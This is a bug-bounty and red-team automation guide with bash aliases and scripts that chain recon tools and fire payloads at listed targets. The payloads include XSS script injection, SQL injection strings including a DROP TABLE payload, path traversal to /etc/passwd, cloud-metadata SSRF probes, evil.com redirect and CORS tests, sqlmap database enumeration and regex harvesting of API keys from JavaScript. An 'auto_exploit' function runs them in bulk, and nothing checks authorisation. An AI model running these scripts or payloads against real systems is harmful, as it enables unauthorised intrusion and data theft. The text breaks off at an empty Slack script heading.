# ⚡ Elite Automation Scripts & Custom Aliases Configuration
## Advanced Bug Bounty & Red Team Automation Arsenal

### 🔧 **Custom Bash Aliases for Bug Bounty**

#### **Essential Bug Bounty Aliases**
```bash
#!/bin/bash
# Save as ~/.bash_aliases or add to ~/.bashrc

echo "🔥 Setting up Elite Bug Bounty Aliases..."

# System & Navigation Aliases
alias ll='ls -alF --color=auto'
alias la='ls -A --color=auto'
alias l='ls -CF --color=auto'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias ~='cd ~'
alias c='clear'
alias h='history'
alias j='jobs -l'
alias path='echo -e ${PATH//:/\\n}'
alias now='date +"%T"'
alias nowtime=now
alias nowdate='date +"%d-%m-%Y"'

# Network & System Information
alias myip='curl -s ifconfig.me'
alias myips='hostname -I'
alias ports='netstat -tulanp'
alias listening='lsof -i -P -n | grep LISTEN'
alias connections='netstat -an | grep ESTABLISHED'
alias processes='ps aux | grep -v grep'
alias meminfo='free -m -l -t'
alias psmem='ps auxf | sort -nr -k 4'
alias psmem10='ps auxf | sort -nr -k 4 | head -10'
alias pscpu='ps auxf | sort -nr -k 3'
alias pscpu10='ps auxf | sort -nr -k 3 | head -10'
alias cpuinfo='lscpu'
alias gpumeminfo='grep -i --color memory /proc/meminfo'

# Package Management
alias update='sudo apt update && sudo apt upgrade'
alias install='sudo apt install'
alias search='apt search'
alias remove='sudo apt remove'
alias autoremove='sudo apt autoremove'
alias autoclean='sudo apt autoclean'

# File Operations
alias cp='cp -i'
alias mv='mv -i'
alias rm='rm -i'
alias mkdir='mkdir -pv'
alias grep='grep --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias diff='colordiff'
alias mount='mount | column -t'
alias tree='tree -C'
alias du='du -kh'
alias df='df -kTh'

# Archive Operations
alias tarls='tar -tvf'
alias untar='tar -xf'
alias targz='tar -czf'
alias untargz='tar -xzf'

# Git Aliases
alias gs='git status'
alias ga='git add'
alias gc='git commit'
alias gp='git push'
alias gl='git log --oneline'
alias gd='git diff'
alias gb='git branch'
alias gco='git checkout'
alias gcl='git clone'
alias gpl='git pull'

# Bug Bounty Specific Aliases
alias subenum='subfinder -d'
alias httpx-check='httpx -silent -status-code -title -tech-detect'
alias nmap-quick='nmap -T4 -F'
alias nmap-full='nmap -T4 -A -v'
alias nmap-udp='nmap -sU -T4'
alias nmap-tcp='nmap -sS -T4'
alias gobuster-dir='gobuster dir -u'
alias gobuster-dns='gobuster dns -d'
alias ffuf-dir='ffuf -w ~/wordlists/directories/common.txt -u'
alias nuclei-scan='nuclei -t ~/nuclei-templates/ -u'
alias sqlmap-test='sqlmap -u --batch --dbs'
alias nikto-scan='nikto -h'
alias whatweb-scan='whatweb'
alias wafw00f-test='wafw00f'

# Reconnaissance Aliases
alias recon-passive='echo "Starting passive reconnaissance..." && subenum'
alias recon-active='echo "Starting active reconnaissance..." && nmap-quick'
alias recon-web='echo "Starting web reconnaissance..." && whatweb-scan'
alias recon-full='echo "Starting full reconnaissance..." && recon-passive && recon-active && recon-web'

# Directory Fuzzing Aliases
alias fuzz-common='ffuf -w ~/wordlists/directories/common.txt -u'
alias fuzz-big='ffuf -w ~/wordlists/directories/big.txt -u'
alias fuzz-raft='ffuf -w ~/wordlists/directories/raft-large-directories.txt -u'

# Parameter Discovery
alias param-discover='echo "Discovering parameters..." && cat urls.txt | gau | grep "=" | qsreplace "FUZZ"'
alias param-fuzz='ffuf -w ~/wordlists/parameters/common.txt -u'

# XSS Testing
alias xss-test='echo "Testing for XSS..." && cat urls.txt | gau | grep "=" | qsreplace "<script>alert(1)</script>"'
alias xss-dalfox='dalfox url'

# SQL Injection Testing
alias sqli-test='echo "Testing for SQL injection..." && sqlmap-test'
alias sqli-time='sqlmap -u --batch --technique=T'
alias sqli-blind='sqlmap -u --batch --technique=B'

# SSRF Testing
alias ssrf-test='echo "Testing for SSRF..." && cat urls.txt | gau | grep "=" | qsreplace "http://169.254.169.254/latest/meta-data/"'

# File Upload Testing
alias upload-test='echo "Testing file upload..." && curl -X POST -F "file=@test.php"'

# JWT Testing
alias jwt-decode='echo "Decoding JWT..." && python3 -c "import jwt; print(jwt.decode(input(), verify=False))"'

# API Testing
alias api-test='echo "Testing API endpoints..." && curl -X GET -H "Content-Type: application/json"'
alias api-post='curl -X POST -H "Content-Type: application/json" -d'
alias api-put='curl -X PUT -H "Content-Type: application/json" -d'
alias api-delete='curl -X DELETE -H "Content-Type: application/json"'

# Cloud Testing
alias aws-enum='echo "Enumerating AWS resources..." && aws s3 ls'
alias azure-enum='echo "Enumerating Azure resources..." && az storage account list'
alias gcp-enum='echo "Enumerating GCP resources..." && gsutil ls'

# Docker & Container Testing
alias docker-enum='docker ps -a'
alias docker-images='docker images'
alias docker-networks='docker network ls'
alias docker-volumes='docker volume ls'

# Kubernetes Testing
alias k8s-pods='kubectl get pods'
alias k8s-services='kubectl get services'
alias k8s-secrets='kubectl get secrets'
alias k8s-configmaps='kubectl get configmaps'

# Log Analysis
alias log-access='tail -f /var/log/apache2/access.log'
alias log-error='tail -f /var/log/apache2/error.log'
alias log-auth='tail -f /var/log/auth.log'
alias log-syslog='tail -f /var/log/syslog'

# Tmux Aliases
alias tmux-new='tmux new-session -s'
alias tmux-list='tmux list-sessions'
alias tmux-attach='tmux attach-session -t'
alias tmux-kill='tmux kill-session -t'

# Screen Aliases
alias screen-new='screen -S'
alias screen-list='screen -ls'
alias screen-resume='screen -r'

# Burp Suite & Proxy
alias burp='java -jar ~/tools/burpsuite_community.jar &'
alias proxy-on='export http_proxy=http://127.0.0.1:8080 && export https_proxy=http://127.0.0.1:8080'
alias proxy-off='unset http_proxy && unset https_proxy'

# OWASP ZAP
alias zap='~/tools/ZAP/zap.sh &'

# Metasploit
alias msfconsole='sudo msfconsole'
alias msfvenom='sudo msfvenom'

# Wordlist Management
alias wordlist-update='echo "Updating wordlists..." && cd ~/wordlists && git pull'
alias wordlist-seclists='echo "Using SecLists..." && export WORDLIST_PATH=~/wordlists/SecLists'

# Report Generation
alias report-template='cp ~/templates/bug-bounty-report.md'
alias screenshot='scrot -s ~/screenshots/$(date +%Y%m%d_%H%M%S).png'

# Notification Aliases
alias notify-success='notify-send "Bug Bounty" "Task completed successfully!" --icon=dialog-information'
alias notify-error='notify-send "Bug Bounty" "Task failed!" --icon=dialog-error'
alias notify-warning='notify-send "Bug Bounty" "Warning!" --icon=dialog-warning'

# Custom Functions as Aliases
alias target-setup='function _target_setup(){ mkdir -p $1/{recon,scans,exploits,reports,screenshots}; cd $1; echo "Target directory setup for $1 completed"; }; _target_setup'
alias quick-recon='function _quick_recon(){ echo "Quick recon for $1"; subfinder -d $1 -silent | httpx -silent -status-code -title | tee $1-quick-recon.txt; }; _quick_recon'
alias port-scan='function _port_scan(){ echo "Port scanning $1"; nmap -T4 -F $1 | tee $1-ports.txt; }; _port_scan'
alias dir-fuzz='function _dir_fuzz(){ echo "Directory fuzzing $1"; gobuster dir -u $1 -w ~/wordlists/directories/common.txt -o $1-dirs.txt; }; _dir_fuzz'

echo "✅ Elite Bug Bounty aliases configured successfully!"
echo "💡 Reload your shell with: source ~/.bashrc"
```

### 🚀 **Advanced Automation Scripts**

#### **Master Reconnaissance Script**
```bash
#!/bin/bash
# Save as ~/scripts/elite-recon.sh

TARGET=$1
OUTPUT_DIR="$TARGET-$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target.com>"
    exit 1
fi

echo "🔥 Starting Elite Reconnaissance for $TARGET"
echo "📁 Output directory: $OUTPUT_DIR"

# Create output directory structure
mkdir -p $OUTPUT_DIR/{subdomains,ports,web,vulnerabilities,screenshots,reports}
cd $OUTPUT_DIR

# Phase 1: Subdomain Enumeration
echo "🌐 Phase 1: Subdomain Enumeration"
echo "Running subfinder..."
subfinder -d $TARGET -silent -o subdomains/subfinder.txt

echo "Running amass..."
amass enum -passive -d $TARGET -o subdomains/amass.txt

echo "Running assetfinder..."
assetfinder --subs-only $TARGET > subdomains/assetfinder.txt

echo "Certificate transparency search..."
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subdomains/crt.txt

echo "Combining all subdomains..."
cat subdomains/*.txt | sort -u > subdomains/all_subdomains.txt
SUBDOMAIN_COUNT=$(wc -l < subdomains/all_subdomains.txt)
echo "✅ Found $SUBDOMAIN_COUNT unique subdomains"

# Phase 2: Live Host Detection
echo "🌍 Phase 2: Live Host Detection"
echo "Checking live hosts..."
cat subdomains/all_subdomains.txt | httpx -silent -status-code -title -tech-detect -o web/live_hosts.txt
cat web/live_hosts.txt | awk '{print $1}' > web/live_urls.txt
LIVE_COUNT=$(wc -l < web/live_urls.txt)
echo "✅ Found $LIVE_COUNT live hosts"

# Phase 3: Port Scanning
echo "🔍 Phase 3: Port Scanning"
echo "Running nmap on live hosts..."
while read -r host; do
    echo "Scanning $host..."
    nmap -T4 -F "$host" -oN "ports/${host//\//_}-ports.txt" &
done < web/live_urls.txt
wait

# Phase 4: Web Technology Detection
echo "🕷️ Phase 4: Web Technology Detection"
echo "Running whatweb..."
while read -r url; do
    whatweb "$url" >> web/whatweb_results.txt
done < web/live_urls.txt

# Phase 5: Directory Fuzzing
echo "📁 Phase 5: Directory Fuzzing"
echo "Running gobuster on top 10 hosts..."
head -10 web/live_urls.txt | while read -r url; do
    echo "Fuzzing directories on $url..."
    gobuster dir -u "$url" -w ~/wordlists/directories/common.txt -o "web/${url//\//_}-dirs.txt" -q &
done
wait

# Phase 6: Vulnerability Scanning
echo "💥 Phase 6: Vulnerability Scanning"
echo "Running nuclei..."
cat web/live_urls.txt | nuclei -t ~/nuclei-templates/ -o vulnerabilities/nuclei_results.txt -silent

echo "Running nikto on top 5 hosts..."
head -5 web/live_urls.txt | while read -r url; do
    echo "Running nikto on $url..."
    nikto -h "$url" -output "vulnerabilities/${url//\//_}-nikto.txt" &
done
wait

# Phase 7: Parameter Discovery
echo "🔍 Phase 7: Parameter Discovery"
echo "Discovering parameters..."
cat web/live_urls.txt | gau | grep "=" | qsreplace "FUZZ" > web/parameters.txt
PARAM_COUNT=$(wc -l < web/parameters.txt)
echo "✅ Found $PARAM_COUNT potential parameters"

# Phase 8: JavaScript Analysis
echo "📜 Phase 8: JavaScript Analysis"
echo "Finding JavaScript files..."
cat web/live_urls.txt | katana -d 3 -js-crawl | grep "\.js$" > web/js_files.txt

echo "Extracting secrets from JS files..."
while read -r js_file; do
    echo "Analyzing $js_file..."
    curl -s "$js_file" | grep -Eo "(AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}|sk_test_[0-9a-zA-Z]{24}|AIza[0-9A-Za-z\\-_]{35}|ya29\\.[0-9A-Za-z\\-_]+)" >> vulnerabilities/secrets.txt
done < web/js_files.txt

# Phase 9: Screenshot Generation
echo "📸 Phase 9: Screenshot Generation"
echo "Taking screenshots..."
head -20 web/live_urls.txt | while read -r url; do
    echo "Screenshot: $url"
    wkhtmltoimage --width 1920 --height 1080 "$url" "screenshots/${url//\//_}.png" 2>/dev/null &
done
wait

# Phase 10: Report Generation
echo "📊 Phase 10: Report Generation"
cat > reports/summary.md << EOF
# Reconnaissance Report for $TARGET
**Date:** $(date)
**Target:** $TARGET

## Summary
- **Subdomains Found:** $SUBDOMAIN_COUNT
- **Live Hosts:** $LIVE_COUNT
- **Parameters Discovered:** $PARAM_COUNT

## Files Generated
- Subdomains: subdomains/all_subdomains.txt
- Live Hosts: web/live_urls.txt
- Port Scans: ports/
- Vulnerabilities: vulnerabilities/
- Screenshots: screenshots/

## Next Steps
1. Manual testing of identified parameters
2. Deep dive into interesting subdomains
3. Exploit identified vulnerabilities
4. Social engineering reconnaissance
EOF

echo "🎯 Elite Reconnaissance Completed!"
echo "📁 Results saved in: $OUTPUT_DIR"
echo "📊 Summary report: $OUTPUT_DIR/reports/summary.md"

# Send notification
notify-send "Elite Recon" "Reconnaissance completed for $TARGET" --icon=dialog-information
```

#### **Automated Vulnerability Scanner**
```bash
#!/bin/bash
# Save as ~/scripts/vuln-scanner.sh

TARGET_FILE=$1
OUTPUT_DIR="vulnscan-$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET_FILE" ]; then
    echo "Usage: $0 <targets.txt>"
    exit 1
fi

echo "🔥 Starting Automated Vulnerability Scanning"
mkdir -p $OUTPUT_DIR/{xss,sqli,ssrf,rce,lfi,xxe,cors,jwt,api}
cd $OUTPUT_DIR

# XSS Testing
echo "💉 Testing for XSS vulnerabilities..."
cat ../$TARGET_FILE | gau | grep "=" | qsreplace "<script>alert('XSS')</script>" | while read -r url; do
    response=$(curl -s "$url")
    if echo "$response" | grep -q "alert('XSS')"; then
        echo "$url" >> xss/reflected_xss.txt
        echo "✅ Potential XSS found: $url"
    fi
done

# SQL Injection Testing
echo "💾 Testing for SQL injection..."
cat ../$TARGET_FILE | while read -r url; do
    echo "Testing SQL injection on: $url"
    sqlmap -u "$url" --batch --level=3 --risk=2 --dbs --output-dir=sqli/ --threads=5 &
done
wait

# SSRF Testing
echo "🌐 Testing for SSRF..."
cat ../$TARGET_FILE | gau | grep "=" | qsreplace "http://169.254.169.254/latest/meta-data/" | while read -r url; do
    response=$(curl -s "$url")
    if echo "$response" | grep -q "instance-id\|ami-id"; then
        echo "$url" >> ssrf/ssrf_vulnerable.txt
        echo "🚨 SSRF vulnerability found: $url"
    fi
done

# Open Redirect Testing
echo "🔄 Testing for Open Redirects..."
cat ../$TARGET_FILE | gau | grep "=" | qsreplace "http://evil.com" | while read -r url; do
    response=$(curl -s -I "$url")
    if echo "$response" | grep -q "Location: http://evil.com"; then
        echo "$url" >> redirect/open_redirect.txt
        echo "🔓 Open redirect found: $url"
    fi
done

# CORS Testing
echo "🌍 Testing CORS misconfigurations..."
cat ../$TARGET_FILE | while read -r url; do
    response=$(curl -s -H "Origin: https://evil.com" -I "$url")
    if echo "$response" | grep -q "Access-Control-Allow-Origin: https://evil.com"; then
        echo "$url" >> cors/cors_misconfigured.txt
        echo "🔓 CORS misconfiguration found: $url"
    fi
done

# Generate vulnerability report
cat > vulnerability_report.md << EOF
# Vulnerability Scan Report
**Date:** $(date)
**Targets Scanned:** $(wc -l < ../$TARGET_FILE)

## Vulnerabilities Found

### XSS Vulnerabilities
$(if [ -f xss/reflected_xss.txt ]; then wc -l < xss/reflected_xss.txt; else echo "0"; fi) potential XSS vulnerabilities found.

### SQL Injection
Check sqli/ directory for detailed SQLMap results.

### SSRF Vulnerabilities
$(if [ -f ssrf/ssrf_vulnerable.txt ]; then wc -l < ssrf/ssrf_vulnerable.txt; else echo "0"; fi) potential SSRF vulnerabilities found.

### Open Redirects
$(if [ -f redirect/open_redirect.txt ]; then wc -l < redirect/open_redirect.txt; else echo "0"; fi) open redirect vulnerabilities found.

### CORS Misconfigurations
$(if [ -f cors/cors_misconfigured.txt ]; then wc -l < cors/cors_misconfigured.txt; else echo "0"; fi) CORS misconfigurations found.

## Recommendations
1. Implement proper input validation
2. Use parameterized queries for database operations
3. Validate and sanitize all user inputs
4. Implement proper CORS policies
5. Use Content Security Policy (CSP) headers
EOF

echo "✅ Vulnerability scanning completed!"
echo "📊 Report generated: $OUTPUT_DIR/vulnerability_report.md"
```

#### **API Security Testing Script**
```bash
#!/bin/bash
# Save as ~/scripts/api-security-test.sh

API_BASE_URL=$1
OUTPUT_DIR="api-test-$(date +%Y%m%d_%H%M%S)"

if [ -z "$API_BASE_URL" ]; then
    echo "Usage: $0 <api-base-url>"
    exit 1
fi

echo "🔌 Starting API Security Testing for $API_BASE_URL"
mkdir -p $OUTPUT_DIR/{endpoints,auth,injection,business-logic,rate-limiting}
cd $OUTPUT_DIR

# Endpoint Discovery
echo "🔍 Discovering API endpoints..."
curl -s "$API_BASE_URL/swagger.json" | jq -r '.paths | keys[]' > endpoints/swagger_endpoints.txt 2>/dev/null
curl -s "$API_BASE_URL/api-docs" | grep -oE '"/[^"]*"' | tr -d '"' > endpoints/api_docs_endpoints.txt 2>/dev/null
curl -s "$API_BASE_URL/openapi.json" | jq -r '.paths | keys[]' > endpoints/openapi_endpoints.txt 2>/dev/null

# Common API endpoints
cat > endpoints/common_api_endpoints.txt << 'EOF'
/api/v1/users
/api/v1/admin
/api/v1/login
/api/v1/register
/api/v1/password/reset
/api/v1/profile
/api/v1/settings
/api/v1/config
/api/v1/health
/api/v1/status
/api/v1/version
/api/v1/docs
/api/v1/swagger
/api/v1/openapi
/api/v2/users
/api/v2/admin
/graphql
/graphiql
/playground
EOF

# Combine all endpoints
cat endpoints/*.txt | sort -u > endpoints/all_endpoints.txt

# Authentication Testing
echo "🔐 Testing authentication mechanisms..."
while read -r endpoint; do
    full_url="$API_BASE_URL$endpoint"
    
    # Test without authentication
    response=$(curl -s -w "%{http_code}" -o /dev/null "$full_url")
    echo "$full_url - No Auth: $response" >> auth/no_auth_responses.txt
    
    # Test with invalid token
    response=$(curl -s -w "%{http_code}" -o /dev/null -H "Authorization: Bearer invalid_token" "$full_url")
    echo "$full_url - Invalid Token: $response" >> auth/invalid_token_responses.txt
    
    # Test with SQL injection in auth header
    response=$(curl -s -w "%{http_code}" -o /dev/null -H "Authorization: Bearer ' OR '1'='1" "$full_url")
    echo "$full_url - SQL Injection Auth: $response" >> auth/sqli_auth_responses.txt
    
done < endpoints/all_endpoints.txt

# HTTP Method Testing
echo "🔄 Testing HTTP methods..."
while read -r endpoint; do
    full_url="$API_BASE_URL$endpoint"
    
    for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
        response=$(curl -s -w "%{http_code}" -o /dev/null -X "$method" "$full_url")
        echo "$full_url - $method: $response" >> endpoints/method_responses.txt
    done
done < endpoints/all_endpoints.txt

# Injection Testing
echo "💉 Testing for injection vulnerabilities..."
injection_payloads=(
    "' OR '1'='1"
    "'; DROP TABLE users; --"
    "<script>alert('XSS')</script>"
    "{{7*7}}"
    "${7*7}"
    "../../../etc/passwd"
    "http://169.254.169.254/latest/meta-data/"
)

while read -r endpoint; do
    full_url="$API_BASE_URL$endpoint"
    
    for payload in "${injection_payloads[@]}"; do
        # Test in URL parameter
        response=$(curl -s "$full_url?test=$payload")
        if echo "$response" | grep -q "49\|root:\|instance-id\|alert('XSS')"; then
            echo "$full_url?test=$payload - VULNERABLE" >> injection/vulnerable_endpoints.txt
        fi
        
        # Test in POST body
        response=$(curl -s -X POST -H "Content-Type: application/json" -d "{\"test\":\"$payload\"}" "$full_url")
        if echo "$response" | grep -q "49\|root:\|instance-id\|alert('XSS')"; then
            echo "$full_url POST {\"test\":\"$payload\"} - VULNERABLE" >> injection/vulnerable_endpoints.txt
        fi
    done
done < endpoints/all_endpoints.txt

# Rate Limiting Testing
echo "⚡ Testing rate limiting..."
test_endpoint=$(head -1 endpoints/all_endpoints.txt)
full_url="$API_BASE_URL$test_endpoint"

echo "Testing rate limiting on: $full_url"
for i in {1..100}; do
    response=$(curl -s -w "%{http_code}" -o /dev/null "$full_url")
    echo "Request $i: $response" >> rate-limiting/rate_limit_test.txt
    
    if [ "$response" = "429" ]; then
        echo "✅ Rate limiting detected at request $i"
        break
    fi
    
    sleep 0.1
done

# Business Logic Testing
echo "🧠 Testing business logic flaws..."
# Test for IDOR
if grep -q "/users/" endpoints/all_endpoints.txt; then
    echo "Testing for IDOR in user endpoints..."
    for id in {1..10}; do
        response=$(curl -s "$API_BASE_URL/api/v1/users/$id")
        if echo "$response" | grep -q "email\|username\|id"; then
            echo "$API_BASE_URL/api/v1/users/$id - Potential IDOR" >> business-logic/idor_findings.txt
        fi
    done
fi

# Generate API security report
cat > api_security_report.md << EOF
# API Security Test Report
**Date:** $(date)
**Target:** $API_BASE_URL

## Endpoints Discovered
$(wc -l < endpoints/all_endpoints.txt) unique endpoints found.

## Authentication Issues
- Endpoints accessible without authentication: $(grep -c "200" auth/no_auth_responses.txt)
- Endpoints with weak authentication: $(grep -c "200" auth/invalid_token_responses.txt)

## Injection Vulnerabilities
$(if [ -f injection/vulnerable_endpoints.txt ]; then wc -l < injection/vulnerable_endpoints.txt; else echo "0"; fi) potential injection vulnerabilities found.

## Rate Limiting
$(if grep -q "429" rate-limiting/rate_limit_test.txt; then echo "Rate limiting is implemented"; else echo "No rate limiting detected"; fi)

## Business Logic Issues
$(if [ -f business-logic/idor_findings.txt ]; then wc -l < business-logic/idor_findings.txt; else echo "0"; fi) potential IDOR vulnerabilities found.

## Recommendations
1. Implement proper authentication and authorization
2. Use input validation and parameterized queries
3. Implement rate limiting on all endpoints
4. Use proper access controls to prevent IDOR
5. Implement API versioning and deprecation policies
6. Use HTTPS for all API communications
7. Implement proper error handling
8. Use API gateways for centralized security
EOF

echo "✅ API security testing completed!"
echo "📊 Report generated: $OUTPUT_DIR/api_security_report.md"
```

### 🎯 **Custom Functions & Advanced Automation**

#### **Target Setup Function**
```bash
#!/bin/bash
# Add to ~/.bashrc

# Function to set up target directory structure
target_setup() {
    if [ -z "$1" ]; then
        echo "Usage: target_setup <target_name>"
        return 1
    fi
    
    local target=$1
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local target_dir="${target}_${timestamp}"
    
    echo "🎯 Setting up target directory for $target"
    
    mkdir -p "$target_dir"/{
        recon/{subdomains,ports,web,dns,certificates},
        scans/{nmap,nuclei,nikto,gobuster,ffuf},
        exploits/{xss,sqli,ssrf,rce,lfi,xxe},
        reports/{markdown,html,pdf},
        screenshots,
        payloads,
        wordlists,
        tools,
        notes
    }
    
    cd "$target_dir"
    
    # Create initial files
    echo "# $target - Bug Bounty Notes" > notes/README.md
    echo "Target: $target" > target_info.txt
    echo "Date: $(date)" >> target_info.txt
    echo "Researcher: $(whoami)" >> target_info.txt
    
    # Create scope file
    cat > scope.txt << EOF
# In Scope
$target
*.$target

# Out of Scope
# Add out of scope domains here
EOF
    
    echo "✅ Target directory structure created: $target_dir"
    echo "📁 Current directory: $(pwd)"
}

# Function for quick reconnaissance
quick_recon() {
    if [ -z "$1" ]; then
        echo "Usage: quick_recon <domain>"
        return 1
    fi
    
    local domain=$1
    echo "🔍 Starting quick reconnaissance for $domain"
    
    # Subdomain enumeration
    echo "Finding subdomains..."
    subfinder -d "$domain" -silent | tee recon/subdomains/subfinder.txt
    
    # Live host detection
    echo "Checking live hosts..."
    cat recon/subdomains/subfinder.txt | httpx -silent -status-code -title | tee recon/web/live_hosts.txt
    
    # Quick port scan
    echo "Quick port scan..."
    nmap -T4 -F "$domain" | tee scans/nmap/quick_scan.txt
    
    # Technology detection
    echo "Detecting technologies..."
    whatweb "$domain" | tee recon/web/whatweb.txt
    
    echo "✅ Quick reconnaissance completed for $domain"
}

# Function for deep reconnaissance
deep_recon() {
    if [ -z "$1" ]; then
        echo "Usage: deep_recon <domain>"
        return 1
    fi
    
    local domain=$1
    echo "🕵️ Starting deep reconnaissance for $domain"
    
    # Multiple subdomain sources
    echo "Comprehensive subdomain enumeration..."
    subfinder -d "$domain" -silent -o recon/subdomains/subfinder.txt
    amass enum -passive -d "$domain" -o recon/subdomains/amass.txt
    assetfinder --subs-only "$domain" > recon/subdomains/assetfinder.txt
    
    # Certificate transparency
    curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > recon/subdomains/crt.txt
    
    # Combine and deduplicate
    cat recon/subdomains/*.txt | sort -u > recon/subdomains/all_subdomains.txt
    
    # Live host detection with multiple ports
    echo "Comprehensive live host detection..."
    cat recon/subdomains/all_subdomains.txt | httpx -silent -ports 80,443,8080,8443,8000,9000 -status-code -title -tech-detect | tee recon/web/live_hosts_detailed.txt
    
    # Full port scan
    echo "Full port scan..."
    nmap -T4 -A -v "$domain" | tee scans/nmap/full_scan.txt
    
    # Directory fuzzing
    echo "Directory fuzzing..."
    gobuster dir -u "https://$domain" -w ~/wordlists/directories/common.txt -o scans/gobuster/directories.txt
    
    # Vulnerability scanning
    echo "Vulnerability scanning..."
    nuclei -t ~/nuclei-templates/ -u "https://$domain" -o scans/nuclei/vulnerabilities.txt
    
    echo "✅ Deep reconnaissance completed for $domain"
}

# Function for automated exploitation
auto_exploit() {
    if [ -z "$1" ]; then
        echo "Usage: auto_exploit <target_file>"
        return 1
    fi
    
    local target_file=$1
    echo "💥 Starting automated exploitation"
    
    # XSS testing
    echo "Testing for XSS..."
    cat "$target_file" | gau | grep "=" | qsreplace "<script>alert('XSS')</script>" | while read -r url; do
        response=$(curl -s "$url")
        if echo "$response" | grep -q "alert('XSS')"; then
            echo "$url" >> exploits/xss/reflected_xss.txt
        fi
    done
    
    # SQL injection testing
    echo "Testing for SQL injection..."
    cat "$target_file" | while read -r url; do
        sqlmap -u "$url" --batch --level=2 --risk=2 --dbs --output-dir=exploits/sqli/ &
    done
    wait
    
    # SSRF testing
    echo "Testing for SSRF..."
    cat "$target_file" | gau | grep "=" | qsreplace "http://169.254.169.254/latest/meta-data/" | while read -r url; do
        response=$(curl -s "$url")
        if echo "$response" | grep -q "instance-id"; then
            echo "$url" >> exploits/ssrf/ssrf_vulnerable.txt
        fi
    done
    
    echo "✅ Automated exploitation completed"
}
```

### 📊 **Reporting & Notification System**

#### **Automated Report Generation**
```bash
#!/bin/bash
# Save as ~/scripts/generate-report.sh

TARGET=$1
REPORT_DIR="reports"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

echo "📊 Generating comprehensive report for $TARGET"

# Create report directory if it doesn't exist
mkdir -p $REPORT_DIR

# Generate HTML report
cat > $REPORT_DIR/${TARGET}_report.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Bug Bounty Report - $TARGET</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .header { background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #3498db; }
        .critical { border-left-color: #e74c3c; }
        .high { border-left-color: #f39c12; }
        .medium { border-left-color: #f1c40f; }
        .low { border-left-color: #27ae60; }
        .info { border-left-color: #3498db; }
        pre { background: #f8f9fa; padding: 10px; border-radius: 3px; overflow-x: auto; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat-box { text-align: center; padding: 15px; background: #ecf0f1; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 Elite Bug Bounty Report</h1>
        <h2>Target: $TARGET</h2>
        <p>Date: $(date)</p>
        <p>Researcher: $(whoami)</p>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <h3>$(if [ -f recon/subdomains/all_subdomains.txt ]; then wc -l < recon/subdomains/all_subdomains.txt; else echo "0"; fi)</h3>
            <p>Subdomains Found</p>
        </div>
        <div class="stat-box">
            <h3>$(if [ -f recon/web/live_hosts.txt ]; then wc -l < recon/web/live_hosts.txt; else echo "0"; fi)</h3>
            <p>Live Hosts</p>
        </div>
        <div class="stat-box">
            <h3>$(if [ -f exploits/xss/reflected_xss.txt ]; then wc -l < exploits/xss/reflected_xss.txt; else echo "0"; fi)</h3>
            <p>XSS Vulnerabilities</p>
        </div>
        <div class="stat-box">
            <h3>$(if [ -f exploits/ssrf/ssrf_vulnerable.txt ]; then wc -l < exploits/ssrf/ssrf_vulnerable.txt; else echo "0"; fi)</h3>
            <p>SSRF Vulnerabilities</p>
        </div>
    </div>
    
    <div class="section critical">
        <h2>🚨 Critical Findings</h2>
        <h3>SSRF Vulnerabilities</h3>
        <pre>$(if [ -f exploits/ssrf/ssrf_vulnerable.txt ]; then cat exploits/ssrf/ssrf_vulnerable.txt; else echo "No SSRF vulnerabilities found"; fi)</pre>
    </div>
    
    <div class="section high">
        <h2>⚠️ High Severity Findings</h2>
        <h3>XSS Vulnerabilities</h3>
        <pre>$(if [ -f exploits/xss/reflected_xss.txt ]; then cat exploits/xss/reflected_xss.txt; else echo "No XSS vulnerabilities found"; fi)</pre>
    </div>
    
    <div class="section info">
        <h2>📊 Reconnaissance Summary</h2>
        <h3>Subdomains Discovered</h3>
        <pre>$(if [ -f recon/subdomains/all_subdomains.txt ]; then head -20 recon/subdomains/all_subdomains.txt; else echo "No subdomains found"; fi)</pre>
        
        <h3>Live Hosts</h3>
        <pre>$(if [ -f recon/web/live_hosts.txt ]; then head -20 recon/web/live_hosts.txt; else echo "No live hosts found"; fi)</pre>
    </div>
    
    <div class="section">
        <h2>🛠️ Tools Used</h2>
        <ul>
            <li>Subfinder - Subdomain discovery</li>
            <li>Httpx - HTTP probe</li>
            <li>Nmap - Port scanning</li>
            <li>Gobuster - Directory fuzzing</li>
            <li>Nuclei - Vulnerability scanning</li>
            <li>SQLMap - SQL injection testing</li>
            <li>Custom scripts - Automated testing</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>📝 Recommendations</h2>
        <ol>
            <li>Implement proper input validation on all user inputs</li>
            <li>Use parameterized queries to prevent SQL injection</li>
            <li>Implement Content Security Policy (CSP) headers</li>
            <li>Validate and sanitize all URL parameters</li>
            <li>Use allowlists for SSRF protection</li>
            <li>Implement proper authentication and authorization</li>
            <li>Regular security assessments and penetration testing</li>
        </ol>
    </div>
</body>
</html>
EOF

echo "✅ HTML report generated: $REPORT_DIR/${TARGET}_report.html"

# Generate PDF report (requires wkhtmltopdf)
if command -v wkhtmltopdf &> /dev/null; then
    wkhtmltopdf $REPORT_DIR/${TARGET}_report.html $REPORT_DIR/${TARGET}_report.pdf
    echo "✅ PDF report generated: $REPORT_DIR/${TARGET}_report.pdf"
fi

# Send notification
notify-send "Report Generated" "Bug bounty report for $TARGET has been generated" --icon=dialog-information
```

### 🔔 **Notification & Monitoring System**

#### **Slack Notification Integration**
```bash
#!/bin/bash
# Save as ~/scripts/slack-notify.sh

